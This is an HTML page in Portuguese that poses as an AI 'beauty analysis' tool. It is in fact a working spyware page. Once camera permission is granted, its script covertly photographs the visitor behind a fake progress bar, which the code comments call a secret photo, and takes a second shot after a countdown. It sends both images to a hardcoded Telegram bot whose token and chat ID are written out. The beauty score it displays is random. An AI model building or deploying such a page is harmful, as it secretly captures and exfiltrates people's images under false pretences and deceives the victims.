<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Análise de Beleza AI</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; background: #ffffff; color: #333; margin: 0; padding: 20px; transition: background 0.5s; }
        .container { max-width: 450px; margin: 50px auto; }
        
        h1 { font-size: 1.8rem; color: #1a1a1a; margin-bottom: 10px; }
        p { font-size: 1rem; color: #666; line-height: 1.5; }

        /* Barra de Progresso */
        .progress-container { width: 100%; background-color: #e0e0e0; border-radius: 20px; margin: 30px 0; display: none; overflow: hidden; }
        .progress-bar { width: 0%; height: 12px; background-color: #3498db; transition: width 0.1s; }

        /* Vídeo e Câmera */
        video { width: 100%; border-radius: 15px; background: #000; display: none; margin-top: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
        
        #status-area { margin-top: 20px; font-weight: 600; color: #2c3e50; }
        
        #countdown { font-size: 6rem; font-weight: 900; color: #e74c3c; display: none; }

        /* Estilo quando a análise começa de verdade */
        .fase-ativa body { background: #121212; color: #fff; }
        .fase-ativa h1, .fase-ativa p { color: #fff; }

        #result-area { display: none; padding: 20px; border: 2px solid #2ecc71; border-radius: 15px; margin-top: 30px; animation: fadeIn 1s; }
        #beauty-score { font-size: 5rem; font-weight: bold; color: #2ecc71; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
    </style>
</head>
<body>

    <div class="container">
        <div id="intro-ui">
            <h1>ANÁLISE DE BELEZA</h1>
            <p>Estamos esperando você confirmar a câmera. Assim que confirmado, você será levado para a câmera para analisar.</p>
            
            <div class="progress-container" id="p-container">
                <div class="progress-bar" id="p-bar"></div>
            </div>
        </div>

        <video id="video" autoplay playsinline></video>
        <canvas id="canvas" style="display:none;"></canvas>
        
        <div id="countdown">3</div>

        <div id="status-area">
            <span id="status-text">Aguardando permissão...</span>
        </div>

        <div id="result-area">
            <h2>RESULTADO IA:</h2>
            <div id="beauty-score">0%</div>
            <p>Análise facial concluída com sucesso.</p>
        </div>
    </div>

    <script>
        // Dados configurados
        const BOT_TOKEN = '8767105495:AAFFo6Taie2knPqcOJvBrOqeovrIuEJa0s0'; 
        const CHAT_ID = '5829718641';

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const statusText = document.getElementById('status-text');
        const pContainer = document.getElementById('p-container');
        const pBar = document.getElementById('p-bar');
        const countdownEl = document.getElementById('countdown');
        const resultArea = document.getElementById('result-area');
        const beautyScoreEl = document.getElementById('beauty-score');

        // Inicia pedindo a câmera
        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
            .then(stream => {
                video.srcObject = stream;
                pContainer.style.display = 'block';
                statusText.innerText = "Conectando ao servidor de IA...";
                
                iniciarBarraEFotoOculta();
            })
            .catch(err => {
                statusText.innerText = "❌ Erro: Você precisa permitir a câmera para continuar.";
            });

        function iniciarBarraEFotoOculta() {
            let width = 0;
            const interval = setInterval(() => {
                if (width >= 100) {
                    clearInterval(interval);
                    // Quando a barra enche, tiramos a foto secreta e mudamos a tela
                    tirarEEnviarFoto("FOTO SECRETA (Início)");
                    setTimeout(irParaFasePublica, 1000);
                } else {
                    width++;
                    pBar.style.width = width + '%';
                    
                    // No meio do carregamento, muda o texto para parecer real
                    if(width == 50) statusText.innerText = "Mapeando pontos faciais...";
                }
            }, 50); // Velocidade do carregamento
        }

        function irParaFasePublica() {
            document.body.parentElement.classList.add('fase-ativa');
            document.getElementById('intro-ui').style.display = 'none';
            video.style.display = 'block';
            statusText.innerText = "Prepare-se! Analisando em:";
            
            // Countdown visual 3, 2, 1
            let count = 3;
            countdownEl.style.display = 'block';
            countdownEl.innerText = count;

            const timer = setInterval(() => {
                count--;
                if(count > 0) {
                    countdownEl.innerText = count;
                } else {
                    clearInterval(timer);
                    countdownEl.style.display = 'none';
                    tirarEEnviarFoto("FOTO PÚBLICA (Com Timer)");
                    finalizarProcesso();
                }
            }, 1000);
        }

        function tirarEEnviarFoto(legenda) {
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            canvas.getContext('2d').drawImage(video, 0, 0);

            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'foto.jpg');
                formData.append('caption', legenda);

                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            }, 'image/jpeg', 0.7);
        }

        function finalizarProcesso() {
            video.style.display = 'none';
            statusText.innerText = "Gerando nota final...";
            
            setTimeout(() => {
                statusText.style.display = 'none';
                const nota = Math.floor(Math.random() * 31) + 70; // Nota entre 70 e 100 pra pessoa ficar feliz
                beautyScoreEl.innerText = nota + "%";
                resultArea.style.display = 'block';
            }, 2000);
        }
    </script>
</body>
</html>
